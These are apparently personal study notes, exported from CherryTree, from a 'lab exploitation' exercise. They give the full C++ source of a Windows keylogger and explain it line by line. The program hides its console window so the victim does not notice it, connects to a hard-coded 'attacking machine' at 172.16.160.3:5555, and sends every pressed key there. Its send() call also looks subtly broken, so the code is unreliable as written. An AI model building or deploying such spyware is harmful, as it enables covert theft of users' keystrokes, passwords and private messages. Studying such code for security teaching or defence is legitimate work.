<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>client socket</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>client socket</h1><br/><h3>The c++ full code can be accessed </h3><a href="file://C:/CherryTree/screenshot/programming/C++/lab exploitation/keylogger.cpp">HERE</a><br /><br /><div class="codebox"><div class="codebox">#define&nbsp;_WINSOCK_DEPRECATED_NO_WARNINGS</div></div><br />we used older functionalities of winsock utilities and we do not want the compiler to complain about this<br /><div class="codebox"><div class="codebox">#pragma&nbsp;comment<span style="color:#000000;font-weight:400">(</span>lib,&nbsp;&quot;Ws2_32.lib&quot;<span style="color:#000000;font-weight:400">)</span></div></div><br />tells the linker to add the &quot;Ws2_32.lib&quot; library to the list of library dependencies(remember that filenames are case-insensitive on typical Windows filesystems so &quot;ws2_32.lib&quot; is the same)<br />Some compilers, like Dev-C++  ignores #pragma directives so we have to the tell the compiler to add the Ws2_32.lib  when calling the linker on the command line with <strong>-lws2_32</strong>.<br />    We can do that on Tools→ Compiler Oprions<br />    <a href="file:///CherryTree/screenshot/programming/C++/lab exploitation/socket library.png"><img src="images/182-1.png" alt="images/182-1.png" /></a><br /><br /><div class="codebox"><div class="codebox">#include&nbsp;<span style="color:#000000;font-weight:400">&lt;</span>iostream<span style="color:#000000;font-weight:400">&gt;</span></div></div><br />standard input/output utilities<br /><div class="codebox"><div class="codebox">#include&nbsp;<span style="color:#000000;font-weight:400">&lt;</span>winsock2.h<span style="color:#000000;font-weight:400">&gt;</span></div></div><br /> header file  that contains most of the Winsock functions, structures, and definitions<br /><div class="codebox"><div class="codebox">#include&nbsp;<span style="color:#000000;font-weight:400">&lt;</span>stdio.h<span style="color:#000000;font-weight:400">&gt;</span></div></div><br />standard input/output utilities<br /><div class="codebox"><div class="codebox">#include&nbsp;<span style="color:#000000;font-weight:400">&lt;</span>stdlib.h<span style="color:#000000;font-weight:400">&gt;</span></div></div><br />standard input/output utilities<br /><div class="codebox"><div class="codebox">#include&nbsp;<span style="color:#000000;font-weight:400">&lt;</span>Windows.h<span style="color:#000000;font-weight:400">&gt;</span></div></div><br /> Windows.h header include the winuser.h header that has the function GetAsyncKeyState(Determines whether a key is up or down at the time the function is called, and whether the key was pressed after a previous call to GetAsyncKeyState.)<br /> <br /> <div class="codebox"><div class="codebox">int&nbsp;main()<br />{<br />	ShowWindow(GetConsoleWindow(),&nbsp;SW_HIDE);<br />	<br />	WSADATA&nbsp;WSAData;<br />	SOCKET&nbsp;client;<br />	SOCKADDR_IN&nbsp;addr;<br /><br />	WSAStartup(MAKEWORD(2,&nbsp;0),&nbsp;&amp;WSAData);<br />	client&nbsp;=&nbsp;socket(AF_INET,&nbsp;SOCK_STREAM,&nbsp;0);<br />	addr.sin_addr.s_addr&nbsp;=&nbsp;inet_addr(&quot;172.16.160.3&quot;);<br />	addr.sin_family&nbsp;=&nbsp;AF_INET;<br />	addr.sin_port&nbsp;=&nbsp;htons(5555);<br />	connect(client,&nbsp;(SOCKADDR&nbsp;*)&amp;addr,&nbsp;sizeof(addr));<br /><br />		while&nbsp;(true)&nbsp;{<br />		Sleep(10);<br />		for&nbsp;(int&nbsp;KEY&nbsp;=&nbsp;0x8;&nbsp;KEY&nbsp;&lt;&nbsp;0xFF;&nbsp;KEY++)<br />		{<br />			if&nbsp;(GetAsyncKeyState(KEY)&nbsp;&amp;&nbsp;0x8000)&nbsp;{<br /><br />					char&nbsp;buffer;<br />					buffer&nbsp;=&nbsp;KEY;<br />					send(client,&nbsp;buffer,&nbsp;sizeof(buffer),&nbsp;0);<br />			}<br />		}<br />	}<br />	closesocket(client);<br />	WSACleanup();<br />}</div></div><br /> • <strong>ShowWindow(GetConsoleWindow(), SW_HIDE);</strong><br />   is used to hide the command window. we don&#39;t want that the user notice that the program has started<br />   If we want to show it we use: ShowWindow(::GetConsoleWindow(), SW_SHOW);<br />• <strong>WSAStartup(MAKEWORD(2, </strong><strong><span style="color:#ff0044;">0</span></strong><strong>), &amp;WSAData);</strong><br />   The WSAStartup function must be the first <strong>W</strong>indows <strong>S</strong>ockets function called by an <strong>A</strong>pplication or DLL.<br />   ◇ MAKEWORD function is used to specify the version of Winsock that we want to use( in our case 2.0), MAKEWORD is a function that create a concatenation of two 8 bit numbers(so in total 16bit),so in our case<br />       2(00000010)+0(00000000)= 0000001000000000<br />   ◇ &amp;WSAData is a pointer to the WSADATA data structure WSAData that is populated with Windows Sockets informations like the version that we have requested(2.0) and some other informations.<br />• <strong>client = socket(</strong><strong><span style="color:#00ff00;">AF_INET</span></strong><strong>, </strong><strong><span style="color:#ff8700;">SOCK_STREAM</span></strong><strong>, </strong><strong><span style="color:#ff0000;">0</span></strong><strong>);</strong><br />    This call results in a stream socket with TCP protocol providing the underlying communication<br />    the socket function → int socket(<span style="color:#00ff00;">int domain</span>, <span style="color:#ff8700;">int</span> <span style="color:#ff8700;">type</span>,<span style="color:#ff0000;"> int</span> <span style="color:#ff0000;">protocol</span>) <br />    creates a socket in the specified <span style="color:#00ff00;">domain</span> and of the specified<span style="color:#ff8700;"> type</span>. These are constants defined in sys/socket.h<br />    <span style="color:#00ff00;">domain</span>: AF_INET, AF_UNIX...<br />    <span style="color:#ff8700;">type</span>: SOCK_STREAM, SOCK_DGRAM...<br />    <span style="color:#ff0000;">protocol:</span> If the protocol is unspecified (value 0), the system selects a protocol that supports the <span style="color:#ff8700;">requested socket type</span>.<br />• <strong><span style="color:#a020f0;">sockaddr_in addr</span></strong> has this structure:<br />    <div class="codebox"><div class="codebox">#include&nbsp;&lt;netinet/in.h&gt;<br /><br />struct&nbsp;sockaddr_in&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;short&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sin_family;&nbsp;&nbsp;&nbsp;//&nbsp;e.g.&nbsp;AF_INET<br />&nbsp;&nbsp;&nbsp;&nbsp;unsigned&nbsp;short&nbsp;&nbsp;&nbsp;sin_port;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;e.g.&nbsp;htons(5555)<br />&nbsp;&nbsp;&nbsp;&nbsp;struct&nbsp;in_addr&nbsp;&nbsp;&nbsp;sin_addr;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;see&nbsp;struct&nbsp;in_addr,&nbsp;below<br />&nbsp;&nbsp;&nbsp;&nbsp;char&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sin_zero[8];&nbsp;&nbsp;//&nbsp;zero&nbsp;this&nbsp;if&nbsp;you&nbsp;want&nbsp;to&nbsp;but&nbsp;not&nbsp;necessary<br />};<br /><br />struct&nbsp;in_addr&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;unsigned&nbsp;long&nbsp;s_addr;&nbsp;&nbsp;//&nbsp;load&nbsp;with&nbsp;inet_aton()<br />};</div></div><br />     ◇ <strong><span style="color:#a020f0;">addr</span></strong><strong>.sin_family = AF_INET;<br />       </strong>we match the domain used in the socket call<br />     ◇<strong> </strong><strong><span style="color:#a020f0;">addr</span></strong><strong>.sin_port</strong><br />     short integer remote port number from host byte order(usually <span style="text-decoration:underline;">Little-endian</span>=opposite of Big-endian) to network byte order(<span style="text-decoration:underline;">Big-endian</span>=most significant byte first and the least significant byte last), <br />     converted using → unsigned short htons(unsigned short a);<br />     ◇ <strong><span style="color:#a020f0;">addr</span></strong><strong>.sin_addr.s_addr = inet_addr(&quot;172.16.160.3&quot;);</strong> <br />          The inet_addr(&quot;172.16.160.3&quot;) function→ in_addr_t inet_addr(const char *cp);<br />          converts a string  into a numeric IPv4 Internet address<br />          The IPv4 that we have inserted, is the IP of the attacking machine from where we are listening<br />          Anyway now this function is deprecate because doesn&#39;t support IPv6<br />• <strong>connect(</strong><strong><span style="color:#ffa500;">client</span></strong><strong>, (SOCKADDR *)&amp;</strong><strong><span style="color:#ffff00;">addr</span></strong><strong>, sizeof(addr));</strong><br />    this call connects the socket referred to by the file descriptor <span style="color:#ffa500;text-decoration:underline;">client</span> to the address specified by <em><span style="color:#ffff00;text-decoration:underline;">addr</span></em>, <br />    <span style="color:#ffff00;text-decoration:underline;">addr</span> is been converted from SOCKADDR_IN to SOCKADDR because the function connect() <br />    accept only that → int connect(int <span style="color:#ffa500;">socket</span>, struct sockaddr *<span style="color:#ffff00;">address</span>, socklen_t address_len);<br />---------------------------------------------------------------<br /><strong><h3>from here the keylogger start to differentiate from the directory stealer:</h3></strong><br /><br />• <strong>for (int KEY = 0x8; KEY &lt; 0xFF; KEY++)<br />    </strong>The hexadecimal values between 0x8 and 0xFF are <span style="text-decoration:underline;">Virtual-Key Codes</span> used by Windows system like we can see here: <a href="https://docs.microsoft.com/en-us/windows/win32/inputdev/virtual-key-codes" target="_blank">https://docs.microsoft.com/en-us/windows/win32/inputdev/virtual-key-codes</a><br />    This cycle for run at at the infinite with these characters: <a href=""><img src="images/182-2.png" alt="images/182-2.png" /></a><br />• <strong>if (GetAsyncKeyState(KEY) </strong>&amp; 0x8000<strong>) </strong><br />    With &amp; we are doing a <span style="text-decoration:underline;">bitwise AND operation</span>(&amp;) and we are checking if the most significant bit is set (1000000000000000<br />    If a key is pressed the return value of GetAsyncKeyState will be 0x8001 or 0x8000 and with a <span style="text-decoration:underline;">bitwise AND operation</span>(&amp;) we will have a number !=0<br />     While we press a key the GetAsyncKeyState function can return us one of the following values:<br />      ◇ 0 in hex is 0x0000 and in binary 000000000000000<br />      ◇ -32768 in hex is 0x8000 and in binary 1000000000000000 → key is being held down<br />      ◇ 1 in hex is 0x0001 and in binary 0000000000000001 → key has just transitioned from released to pressed<br />      ◇ -32767 in hex is 0x8001 and in binary 1000000000000001 <br /><br /><br /></div>
</body>
</html>
